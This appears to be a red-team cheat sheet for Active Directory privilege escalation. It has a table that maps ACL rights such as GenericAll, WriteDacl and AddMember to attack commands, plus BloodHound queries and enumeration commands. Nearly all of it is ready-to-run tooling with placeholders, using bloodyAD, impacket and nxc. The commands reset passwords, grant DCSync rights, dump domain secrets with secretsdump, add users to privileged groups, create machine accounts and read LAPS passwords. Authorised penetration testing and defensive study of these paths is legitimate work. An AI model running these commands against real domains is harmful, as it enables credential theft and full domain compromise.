# AD ACL Abuse Matrix

Translate any BloodHound edge / `nxc ldap -M daclread` result into an action.

| ACL right on target | Attack primitive | Tool |
|---|---|---|
| `GenericAll` / `GenericWrite` on a **User** | Force password reset | `bloodyAD --host <DC> -d <dom> -u <U> -p '<P>' set password <target> <newpass>` |
| `GenericWrite` on `servicePrincipalName` | Targeted Kerberoast | `impacket-GetUserSPNs '<dom>/<U>:<P>' -dc-ip <DC> -request` |
| `GenericWrite` on `msDS-AllowedToActOnBehalfOfOtherIdentity` | RBCD -> impersonate admin | See delegation.md |
| `WriteDacl` / `WriteOwner` | Take ownership -> grant self GenericAll | `bloodyAD --host <DC> -d <dom> -u <U> -p '<P>' set owner <target> <self>` then `add genericAll <target_DN> <self>` |
| `GenericAll` / `WriteDacl` on the **Domain** object | DCSync | `impacket-secretsdump '<dom>/<U>:<P>@<DC>'` |
| `AddMember` on a group | Add self to privileged group | `bloodyAD --host <DC> -d <dom> -u <U> -p '<P>' add groupMember <group> <self>` |
| `GenericAll` on a **Computer** | SMB/RPC exec, ADCS ESC4, Shadow Creds | `impacket-psexec` / `certipy` / `pywhisker` |
| `GenericAll` / `WriteProperty` on `msDS-KeyCredentialLink` | Shadow Credentials -> PKINIT | See shadow-credentials.md |
| `ExtendedRight` User-Force-Change-Password | Reset user password without knowing current | `bloodyAD --host <DC> -d <dom> -u <U> -p '<P>' set password <target> <newpass>` |
| `CreateChild` + `WriteProperty` on an OU | Create objects -> dMSA badSuccessor | See dmsa.md |
| `Reanimate Tombstones` + `CreateChild` on Deleted Objects | Restore deleted user -> known/default creds | `bloodyAD --host <DC> -d <dom> -u <U> -p '<P>' set restore <deleted-user>` |
| `AllowedToAct` / `AllowedToDelegate` edges | Delegation abuse (S4U2self+proxy) | See delegation.md |
| `ms-DS-Machine-Account-Quota` > 0 | Add computer -> local admin on new machine | `impacket-addcomputer '<dom>/<U>:<P>' -computer-name 'EVIL$' -computer-pass 'P@ss123'` |
| `WriteDacl` on target + `DS-Replication-Get-Changes` | Grant self DCSync rights | `bloodyAD --host <DC> -d <dom> -u <U> -p '<P>' add dcsync <self>` |

## BloodHound Queries
- "Shortest Paths to Domain Admins" from owned user.
- `MATCH p=(u:User {name:'X@DOM'})-[r]->(t) RETURN type(r),t.name` -- direct edges from owned user.
- `MATCH (c:Computer)-[:HasSession]->(u:User) RETURN c.name,u.name` -- session hunting.
- Mark owned principals in BloodHound to discover new paths.

## Enumeration Commands
```bash
# BloodHound collection (all methods)
bloodhound-python -d <dom> -u <user> -p '<pass>' -dc <DC> -c all

# Writable objects for current user
bloodyAD --host <DC> -d <dom> -u <user> -p '<pass>' get writable --detail

# DACL on a specific target
nxc ldap <DC> -u <user> -p '<pass>' -M daclread -o TARGET=<target> ACTION=read

# badSuccessor surface check
nxc ldap <DC> -u <user> -p '<pass>' -M badsuccessor

# LAPS passwords
nxc ldap <DC> -u <user> -p '<pass>' -M laps

# Delegation rights
impacket-findDelegation '<dom>/<user>:<pass>' -dc-ip <DC>
```
